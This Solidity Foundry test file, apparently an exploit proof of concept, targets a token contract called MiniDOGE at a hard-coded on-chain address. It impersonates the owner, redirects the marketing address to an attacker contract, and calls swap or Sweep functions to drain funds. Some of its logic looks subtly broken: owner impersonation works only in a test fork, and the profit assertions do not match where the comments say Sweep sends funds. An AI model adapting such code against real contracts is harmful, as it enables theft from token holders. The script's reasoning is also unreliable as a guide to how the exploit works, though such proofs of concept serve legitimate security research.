// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMiniDOGE {
    function owner() external view returns (address);
    function setMarketingAddress(address _marketingAddress) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function uniswapV2Pair() external view returns (address);
    function minimumTokensBeforeSwapAmount() external view returns (uint256);
    function Sweep() external;
}

contract Attacker {
    receive() external payable {}
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xBa07EED3d09055d60CAEf2bDfCa1c05792f2dFad;
    address attacker = address(this);
    IMiniDOGE target;
    Attacker attackerContract;

    // ─── Setup ───────────────────────────────────────
    function setUp() public {
        target = IMiniDOGE(TARGET);
        attackerContract = new Attacker();

        // Fund the contract with BNB for the exploit
        deal(TARGET, 10 ether);

        vm.label(TARGET, "MiniDOGE Target");
        vm.label(address(attackerContract), "Attacker Contract");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalanceThis = address(this).balance;
        uint256 initialBalanceAttacker = address(attackerContract).balance;

        // Get owner and impersonate
        address owner = target.owner();
        vm.startPrank(owner);

        // Set attacker contract as marketing address
        target.setMarketingAddress(address(attackerContract));

        // Enable swap and liquify
        target.setSwapAndLiquifyEnabled(true);

        vm.stopPrank();

        // Try to trigger swap by transferring tokens to pair
        address pair = target.uniswapV2Pair();
        uint256 minTokens = target.minimumTokensBeforeSwapAmount();

        // Check if contract has tokens
        uint256 contractTokenBalance = target.balanceOf(TARGET);

        if (contractTokenBalance >= minTokens) {
            // Transfer to pair to trigger swap
            target.transfer(pair, minTokens);
        } else {
            // Fallback: use Sweep to drain funds to owner (which we control via prank)
            vm.startPrank(owner);
            target.Sweep();
            vm.stopPrank();
        }

        uint256 finalBalanceAttacker = address(attackerContract).balance;
        assertGt(finalBalanceAttacker, initialBalanceAttacker, "Attacker balance should increase");
        uint256 finalBalanceThis = address(this).balance;
        assertGt(finalBalanceThis, initialBalanceThis, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

